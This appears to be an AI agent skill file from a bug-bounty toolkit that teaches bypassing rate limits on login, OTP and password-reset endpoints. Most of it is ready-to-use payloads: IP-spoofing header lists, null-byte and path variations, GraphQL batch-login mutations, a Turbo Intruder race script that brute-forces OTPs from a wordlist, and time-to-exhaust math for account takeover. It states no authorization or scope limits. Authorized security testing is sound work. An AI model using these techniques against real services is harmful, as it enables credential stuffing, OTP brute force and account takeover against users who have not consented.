---
name: rate-limit-bypass
description: "Bypass rate limiting via IP header rotation, path and case variation, GraphQL alias batching, null byte injection, and single-packet races, so OTP brute-force or credential stuffing becomes viable. Use when a verification, login, or password reset endpoint starts throttling — the bypass only becomes reportable once it enables a concrete account takeover."
---

# Rate Limit Bypass Techniques

## Crown Jewel Targets

- **OTP/2FA brute force** — bypass rate limit on verification endpoint to exhaust 4-digit OTP space within expiry window
- **Login credential stuffing** — bypass login rate limit for mass credential testing leading to account takeover
- **Password reset abuse** — unlimited reset attempts enabling token prediction or brute force
- **Payment/transaction replay** — race condition combined with rate limit bypass for financial impact
- **GraphQL batch login** — single request containing 100+ login attempts counting as one rate limit check
- **API key brute force** — enumerate valid API keys through unprotected endpoints

## Attack Surface Signals

- Login/OTP/reset endpoints returning 429 after N attempts (confirms rate limiting exists to bypass)
- `X-RateLimit-*` headers revealing limit values and reset windows
- GraphQL endpoint accepting array or aliased batch queries
- Multiple API versions (`/v1/`, `/v2/`) with potentially different rate limit configs
- CDN/WAF layer applying rate limits (check if backend has its own separate limits)
- Mobile API endpoints (`/mobile/login`) often with relaxed rate limits

## IP Rotation Headers
Test each header to bypass IP-based rate limiting:
- `X-Forwarded-For: 127.0.0.1`
- `X-Real-IP: 127.0.0.1`
- `X-Originating-IP: 127.0.0.1`
- `X-Client-IP: 127.0.0.1`
- `True-Client-IP: 127.0.0.1`
- `CF-Connecting-IP: 127.0.0.1`
- Rotate IP values: `1.1.1.1`, `2.2.2.2`, etc.
- Double header: `X-Forwarded-For: attacker\r\nX-Forwarded-For: 127.0.0.1`

## Header Tricks
- Case variation: `x-forwarded-for` vs `X-FORWARDED-FOR`
- Whitespace: `X-Forwarded-For : 127.0.0.1`
- Null byte: `X-Forwarded-For: 127.0.0.1%00`
- Tab separator: `X-Forwarded-For:\t127.0.0.1`

## Endpoint Variation
- API versioning: `/v1/login` vs `/v2/login` (different rate limits)
- Path normalization: `/api/login` vs `/api//login` vs `/api/./login`
- HTTP method: POST vs PUT vs PATCH
- Case: `/API/Login` vs `/api/login`
- Trailing slash: `/api/login/`

## Race Condition Combo
- Send N parallel requests before counter increments
- Use Burp Turbo Intruder or parallel curl
- Window: rate limit checked → incremented (race between)

## Account Rotation
- Different accounts hitting same endpoint
- Anonymous + authenticated mixed
- Session rotation (new session per attempt)

## GraphQL Batching
- Array batch: `[{query:"mutation{login(user:\"a\",pass:\"1\")}"}, ...]`
- Alias batch: `{a1:login(user:"a",pass:"1") a2:login(user:"a",pass:"2")}`
- Single request = single rate limit check, but N operations

## OTP Brute-Force Calculation
- 4-digit OTP: 10,000 combinations
- 6-digit OTP: 1,000,000 combinations
- Time-to-exhaust = combinations / (requests_per_second * batch_size)
- MUST prove: time_to_exhaust < OTP_expiry_time
- Example: 10,000 / (50 req/s * 100 batch) = 2 seconds < 5 min expiry = VALID

## Distributed Bypass
- Multiple source IPs (proxy rotation)
- Multiple accounts (credential stuffing pattern)
- Time-based: slow and steady under threshold

## Full IP Header Rotation (Copy-Paste)
```
X-Forwarded-For: ROTATE_IP
X-Real-IP: ROTATE_IP
X-Originating-IP: ROTATE_IP
X-Client-IP: ROTATE_IP
True-Client-IP: ROTATE_IP
CF-Connecting-IP: ROTATE_IP
X-Forwarded: ROTATE_IP
Forwarded-For: ROTATE_IP
X-Remote-IP: ROTATE_IP
X-Remote-Addr: ROTATE_IP
X-ProxyUser-Ip: ROTATE_IP
X-Original-URL: /target-endpoint
X-Rewrite-URL: /target-endpoint
X-Custom-IP-Authorization: ROTATE_IP
X-Host: ROTATE_IP
Forwarded: for=ROTATE_IP
```

### Burp Intruder Setup for Header Rotation
```
Position: X-Forwarded-For: §127.0.0.§
Payload: Numbers 1-255 (generates 127.0.0.1 → 127.0.0.255)
Throttle: 0ms (max speed to beat rate limit window)
```

## Null Byte / Special Char Injection
```
# In parameter value
username=admin%00&password=test    # Null byte may reset counter
username=admin%09&password=test    # Tab
username=admin%20&password=test    # Space suffix = different key

# In endpoint
POST /api/login%00 HTTP/1.1       # Null byte in path
POST /api/login%09 HTTP/1.1       # Tab in path
POST /api/login? HTTP/1.1         # Empty query string = different cache key
```

## Header Case Variation (WAF Bypass)
```
x-forwarded-for: 1.2.3.4          # lowercase
X-FORWARDED-FOR: 1.2.3.4          # uppercase  
X-Forwarded-For: 1.2.3.4          # normal
x-Forwarded-for: 1.2.3.4          # mixed
X-FoRwArDeD-fOr: 1.2.3.4          # alternating
```
Some WAFs/rate limiters only check specific case — vary to find which is parsed.

## GraphQL Batching Deep Dive

### Array Batching (Most Common)
```json
[
  {"query":"mutation{login(email:\"user@test.com\",password:\"pass1\")}"},
  {"query":"mutation{login(email:\"user@test.com\",password:\"pass2\")}"},
  {"query":"mutation{login(email:\"user@test.com\",password:\"pass3\")}"}
]
```
Single HTTP request → 1 rate limit check → N login attempts.

### Alias Batching (When Array Disabled)
```graphql
mutation {
  a1: login(email: "user@test.com", password: "pass1") { token }
  a2: login(email: "user@test.com", password: "pass2") { token }
  a3: login(email: "user@test.com", password: "pass3") { token }
}
```
100+ aliases per request is common before server limits kick in.

### Query Depth Bypass
```graphql
{
  login1: resetPassword(email: "user@test.com") { success }
  login2: resetPassword(email: "user@test.com") { success }
  # Repeat 50-100x per request
}
```

## API Version Bypass (Detailed)
```
POST /v1/auth/login  → rate limited (429 after 5 attempts)
POST /v2/auth/login  → no rate limit (new version, forgot to add)
POST /v3/auth/login  → 404? or maybe internal beta
POST /api/v1/login   → different path prefix
POST /auth/login     → without version prefix
POST /internal/login → internal endpoint, no rate limit
POST /mobile/login   → mobile API, different limits
POST /graphql        → batch login via GraphQL
```

## OTP Brute-Force: Complete Math Framework

### Time-to-Exhaust Formula
```
T = C / (R × B × P)

Where:
  T = time to exhaust (seconds)
  C = combinations (4-digit=10000, 6-digit=1000000)
  R = requests per second (without rate limit)
  B = batch size (GraphQL aliases, or parallel requests)
  P = parallel connections
```

### Viability Thresholds
| OTP Length | Combos | At 50 req/s | At 100 req/s (batch) | Typical Expiry |
|------------|--------|-------------|----------------------|----------------|
| 4-digit | 10,000 | 200s (3.3m) | 100s (1.7m) | 5-10 min |
| 5-digit | 100,000 | 2000s (33m) | 1000s (17m) | 5-10 min |
| 6-digit | 1,000,000 | 20000s (5.5h) | 10000s (2.8h) | 5-10 min |

**Rule**: 4-digit OTP without rate limit = almost always brutable. 6-digit = need batching OR very long expiry.

### POC: Prove Brute-Force is Feasible
```
Step 1: Measure — send 100 requests, time it → calculate req/s
Step 2: Check — does server return 429? After how many?
Step 3: Test GraphQL batch — does it count as 1 or N?
Step 4: Calculate T with measured values
Step 5: Compare T vs OTP expiry (check email/SMS timestamp vs expiry)
Step 6: Report with MATH: "10,000 combos / 80 req/s = 125s < 300s expiry"
```

## Race Condition + Rate Limit Combo

### Single Packet Attack (HTTP/2)
```python
# Using h2 library — send all requests in single TCP packet
# Server processes all before rate limit counter updates
import h2.connection
# Build 50 requests, send as single DATA frame burst
```

### Turbo Intruder Gate Pattern
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=1,
                          pipeline=False)
    for word in open('/path/to/otp-list.txt'):
        engine.queue(target.req, word.strip(), gate='race')
    engine.openGate('race')  # All fire in <1ms window
```

## Detection Checklist

- [ ] Test login/OTP/reset endpoints for rate limits (send 20 rapid requests)
- [ ] If 429 returned: test ALL IP rotation headers
- [ ] If still blocked: try endpoint variation (/v2/, trailing slash, case)
- [ ] If still blocked: try GraphQL batch (array + alias)
- [ ] If still blocked: try null byte / whitespace in params
- [ ] If still blocked: try race condition (parallel burst)
- [ ] If still blocked: try account rotation + session rotation
- [ ] Calculate time-to-exhaust with measured throughput
- [ ] Compare T vs OTP expiry — document with math
- [ ] **MUST prove ATO or account compromise** — "no rate limit" alone = REJECT

---

## Operator Notes (Battle-Tested)

- **"No rate limit" alone is NEVER valid** — MEMORY rule: must prove time-to-exhaust < OTP expiry AND demonstrate actual account compromise. Math required in report
- **GraphQL batching is the highest-ROI technique** — single HTTP request = 1 rate limit check but 100+ operations. Test both array and alias batching
- **Mobile API endpoints have weaker limits** — `/mobile/login` or `/api/mobile/auth` often has different (or no) rate limiting compared to web endpoint
- **Measure actual throughput** — send 100 requests, time it, calculate req/s. Don't estimate. Use measured values in report
- **Turbo Intruder gate pattern for race condition** — queue all requests behind gate, open gate for simultaneous burst within <1ms window
- **IP header rotation rarely works on modern stacks** — CDN/WAF vendors ignore `X-Forwarded-For` from clients. Still test but expect low success rate
- **4-digit OTP without rate limit is almost always brutable** — 10,000 / 50 req/s = 200s, well within typical 5-10min expiry

## Related Skills & Chains

| Situation | Pattern / Skill |
|-----------|----------------|
| OTP bypass leads to ATO | `auth-bypass-testing` |
| GraphQL endpoint for batching | `graphql-testing` |
| Race condition on payment | `race-condition-testing` |
| Finding discovered, check chain | `auto-chain-discovery` |
| WAF blocking brute force attempts | `waf-bypass` → `references/waf-generic-evasion.md` |
| API endpoint testing methodology | `api-security-testing` |
